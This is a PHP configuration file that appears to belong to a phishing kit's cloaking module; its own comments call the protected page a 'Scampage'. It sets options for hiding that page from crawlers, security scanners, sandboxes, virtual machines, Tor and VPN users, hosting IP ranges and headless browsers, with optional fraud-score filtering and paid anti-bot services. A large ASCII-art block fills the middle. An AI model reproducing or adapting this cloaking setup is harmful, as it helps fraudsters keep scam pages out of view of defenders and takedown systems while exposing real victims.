<?php
session_start();
ob_start();
$LICENSEKEY = '@psyco_m'; //REPLACE @psyco_m with YOUR USERNAME HERE IN LOWERCASE 
$block_blank_useragent = 'yes'; //yes/ no to block blank user agents
$getipintel = 'yes'; //yes/no getipintel.com check vpn/tor ips 
$iptrooper = 'yes'; //yes/no its same as blackbox https://api.iptrooper.net/check/ip 
$good_devices = 'desktop,smartphone,tablet'; // to evade consoles etc...
$block_bad_devices = 'yes'; //allow only computers /mobiles instead of consoles / crawlers / bots / marketers bots / rss bots / curl etc...
$allow_use_specified_browsers = 'no'; //yes/no to use a list of browsers $allowed_browsers
$allowed_browsers = 'chrome,firefox,chromium,safari,opera,edge,maxthon'; //yes/no
$allowed_operating_systems = 'windows,android,ios'; //yes/no Allowed Operating System To visit Scampage
$block_some_windows_version = 'yes'; //yes/no this will help alot cuz we are in 2021 no one use those mostly google or bots will use it from real browsers to fool us
$blocked_windows_versions = 'windows_xp,windows_2000,windows_2003,windows_vista,windows_me,windows_95,windows_98';
$fuck_hosting_ips = 'yes'; //yes/no //blocks Hostings Using ASNs Mapping
$block_virtualdisplay = 'yes'; //yes/no //blocks Virtual Displays Good to block ( Sandbox , VM , RDP )
$require_cookies = 'yes'; //yes/no //blocks Devices that don't support Cookies like Incogoto Mode && NoScript etc...
$block_unknown_os = 'yes'; //yes/no //blocks Unknown Devices (good for NewComing Bots in future)
$block_unknown_browser = 'yes'; //yes/no //blocks Unknown Browsers (good for NewComing Bots in future)
$block_laptops = 'no'; //yes/no //block allow only desktops
$block_webdriver = 'yes'; //yes/no //block WebDriver
$block_dnt = 'yes'; //yes/no //block users that have DoNotTrack enabled
$block_mobile = 'no'; //yes/no //block mobile devices
$block_apple = 'no'; //yes/no //block apple devices 
$fuck_bad_isp = 'no'; //yes/no //block bad bots sent by (isp's  provided by companies)
$fuck_crawlers = 'yes'; //yes/no //block bots that red page
$fuck_tor = 'yes'; //yes/no //block tor users
$fuck_vpn = 'no'; //yes/no //block vpn users
$setmaxfraudscore = 'no'; //yes/no //set limit for fraud score in ip (only Clean IPS)
$maxfraudscore = '80'; //max fraud score use 70+ for better result
$CountryLock = 'no'; //yes/no This used to only accept visitors from specified countries
$CountryLockCountries = array("us"); //if you choosed no then leave it if yes make it like ('uk','us') and everytime before end bracket add new country 'eg','sa','sy' and this list is used to be list of accepted countries only
$AntiBotPW = 'no'; // yes/no to Use AntiBot.PW
$AntiBotPWToken = 'Token'; // if you choosed No for AntiBotPW then you don't need to put token otherwise put your AntiBotPW Token

/*
                                     . .    .                                   
  .  . .  .  . .  .  . .  .  . .  . .%@X8@XXt .  . .  .  . .  .  . .  .  . .  . 
   .       .       .       .     . t8@@@X8@@;:       .       .       .       .  
     .  .    .  .    .  .    .    :t88.8t@SS :  .  .   . .     . .     . .      
 .       .       .       .     .. X@88:8;.S8X .   .        .       .       .  . 
   .  .    .  .    .  .    .  .   %8@@. %8t.t .  .   .  .   . .  .   . .    .   
  .    .  .    .  .    .  .    . @tt:%. %:..:t .    .     .        .     .    . 
    .       .       .       . .:@; .. ........%%;:.   . .    . . .    .   .     
  .   . .    .  .    . . . .:SS%............:%:.88X .  .   .        .   .   .  .
    .     .    .  .   .  8X@8@X@SSSS%.....: ;@..  t@X@.   .   .  .    .      .  
  .    .   .       ..:;8X8t.:SX 8X8%S ... tS  ........@SX   .      .     . .    
     .   .   .  . .:X888;.:@8888@8@@ :8.@888888:......888@t   . .    .        . 
  .    .      .  . S888...8X8888888S . ..:. . :;::;..:.8@8S.      .    . .  .   
    .     . .   . t@8SS@.SXSXSSS.. ..:.XX8t;S.@@S88SXX.S888; . .    .      .   .
  .   .        .:.@8888:@888888:8t.....::..::....X88@S8@@X8;;@S%: .   .  .   .  
    .   . .  .:8t:8@@X88888@88.: ...............:  .:@@8SS@S;X X;   .   .       
  .         .:8 Xt@S%88@8;....:....:..:....:..:..:.... @S888;;SX% .   .   .  .  
     . .  .  ;88%8S@.t:....:....:.........:........:..8:.:X888%.@ .         .  .
  .          :t8ttt;S%8@%t  ..  :.:.:..::.. : : ..:..: ..:.. @%.X.  .  . .      
    .  . . . :%%8888@:88t:@@8t@8%t;t;.t.;;@8t@:@t.. .Xtt:...::S;  .        .  . 
  .           :88X88;;8@:;t::@88@88@8@@@8@8@@8@S: @%S.%t8t.....;S .  . .     .  
    . .  .  . :.8X%.;@.S.::: .@Xt@8X@88888@8888S.8... S%tX% . :.@  .     . .    
  .       .  ;888%.SXt%:     ..X8tS888@88888888.X.   .:%%X8@.8:.XS   .        . 
     . .   . S.XX8.%@; . .  .  .@8%X888888@X8@.8: .   .%St8%X. X.@ .   . .  .   
  .      .   ;8@; X88%     .  . 8@S:S8888S;S8X8:    .  %StS8@ ; SS.  .        . 
    .  .    .;888:888t .  .    ..@X;%8888XtS8t:%;t:  . %St;8;:. 888.    . .     
  .       .  :88@:@88;.      .:: X8X;%888@;S8X.@%St .  tS;Xt...t8@X . .     . . 
    . . .    ;8:8.@8@ .  .  .:SS.S8@t%88@SX88X:@%St...  tt%8X@ 8%X@ .    .      
  .        . %tt@@888%;.  . .t;S S888t88XtX8@8 %;;;t; .  ;@88@888@;    .   .  . 
     .  .  . tX:.X88Xt%t%%:  .%%88888t888SX88@ X:        t@8@ t8@% .     .      
  .          .;8tS.SS;        . %8888t%8Xt@88X.tt .  .   t@8@%888@  . .    . .  
    . .  .  . :8tX%888:. . . . X8@888%t8%tS88.: %X .  . :t@t.SS@ 8 .    .      .
  .     .     .X8@tt8XS..   .SX;88888S;8XS@88..: S8S .  tXS;8.8 8 .   .   .  .  
     .    .  .  @@S.;88X  .;8@@@888888.8%@8X8.:.. .;X@X@8@@. ..tt   .           
  .    .       .%@@8%% @88X@@888888888;8%%@88....:... . . ....t% .     . . .  . 
   .     . .    88888;;88;X8888;888888:88XS88............: ;88S.   . .       .  
     . .     ..t:%XS8X@88X;t@88X88888@%8@t%X....:.....:.. .;@888:.      .  .    
 .  .     .  .@t X888888888@888t888X88t88X%@.:...:.....: SXS8@Xt   .  .       . 
       .  . @%@88;.S8X8888888@88Xt:X@88888@8 ............%8X;tt. .      . .  .  
  .  .      t@X@: :.%;@888@888@X: .S@8888%X88 :....:.:: 8@88  .    . .      .   
   .   . . 88%X::.X:8.S88888@8;%:..X@88t@SX88 ...:....;;8X%..    .     .  .    .
 .      .:t:  ; : S.t8S88888888@8;;8@@S%@SX88..:....:@@88S@@ .  .   .        .  
    . .  :X . : ;:X ..  88@8888 :..%@8888SX88 :..:...8@@S;.   .       . .  .    
  .    . %.8.:8 .8.   ..;8888888:. S@8;S@X@88.....S88888%. .     . .      .   . 
    .   ;.SSSS%@S;  .   .t@8@88@:. S@8;88X888 .. @@8888S.   .  .     .  .   .   
  .   . t :X8@;@;       . @88@888% %@888@8888.::.X@888%;: .      .     .       .
       .    ;@8@. .  .    ;X8888Xt.S@8S@X8@8:.. X888t%%:.    . .   . .    .  .  
  . .    .   . .      .    :t%888S8S8t;;;;%8888SS8%;%%;    .            .   .   
      .   .       . .   .  :S%%@::%%t%ttttt;::: S8@:%%  .    .  . .  .    .    .
  .    .    .  .      .   . .:%ttS@8%;X%@8ttSS8tX;;St:    .           .      .  
    .    .    .  .  .    .  .%%.@: :..:.:..:..:.S8@8  .  .  . .  . .    .  .    
  .   .    .           .    . .8%: ..:. ....:...@S@:.           .    .   .   .  
    .   .    .  . .  .   .   .t88XXXSXSXXXXXXXX%88S  . .  .  .     .   .       .
  .       .    .    .  . tSSX888888888888888888888888S%. .     .  .       . .   
     . .    .     .   .%XXX888 @888S@8888888@8@@;.SSX:88@t . .      . . .     . 
  .     .  .  .      :X%8@X@@8@88@888888888888@88@@88X88t@@.   . .         .    
    .     .     . . :S888888888888888@888888888888888888888X .     .  .  .   .  
  .   . .    .   . t@t8@8@88SX88@S%;t@@8888S%%X8888888888888S   .       .      .
    .      .   .   %@%8@88@@88@88SS888888888X:X888@88888888@t..   . . .   . .   
  .    .     .   . tSS88888XS@888888888888888888@@;S@8@888@@%;  .             . 
     .   . .     . t888@8888@88888888888888888888@@@888.@8888;     .  .  .  .   
  .    .      .    :S@S888888888888888888888888888888888888@:t .  .     .      .
    .     .  .  . ;t%88888888888888888888888888888888888@%.X8t  .    .    . .   
  .   . .         :tX8@888@8@8888888888@8888@88@8888@888@X ;8%.    .   .      . 
    .     . .  . .;tS8@888888888888888888888888888888888@S ;8;   .       .  .   
  .    .          :tS8@888888888888888888888888888888888@X.;8;.     . .   .    .
     .   .  . . . :tS8@88@888888@8@888@888@888888@888888XX ;8;  .  .    .    .  
  .    .          :tX8888@@888888@XX@8@8888888888888888@X: ;8%    .   .    .    
    .     .  .  . ;@8%888888@88@8@XX@88@88888@88@888@888XS.X8t:.    .    .    . 
  .   .  .    .   ;@888:;:;X8888888888888888888@88X;8::88XX@ttS. .     .    .   
    .      .    .;tS@t%%%@8@%%88888@S88888888888X%%S88%t;:;X8@X.   .  .   .   . 
  .    .     .   :8tX@ SXt:;%@8X888S;%t%t8@;S88;;S@S::;;:S888:%. .      .   .   
     .   . .   . .%%%.t8XXS:;t.;.XXtX88@8888XX@tt;;;:::@8;:S8@t.   . .    .    .
  .    .        . .S8XX SSXX8X8%;8@t%SXttSS%t;;t;ttt%SXXSXt.@8;  .     .     .  
    .    .  . .    ::::%@XSSS@8@@88XX@8888888888888@@8SS@88::.      .    .      
  .   .               ..   ;%:%%%;8:t;;;;:;;;;ttt;8;Xt;%:      .  .   .    .  . 
    .   .  .  . . .  .   . ..    .    .ttt%: .    . . ..  .  .      .   .   .   
  .      .              .     .   . .      .   .               . .        .    .
     . .   . .  .  .  .    .    .      . .   .   .  .  . . . .     . . .     .  
*/
$KillBot = 'no'; //yes/no to Use killbot.org 
$KillBotPW = 'Token'; // if you choosed No for KillBot then you d'ont need to put token otherwise put your killbot Token
?>
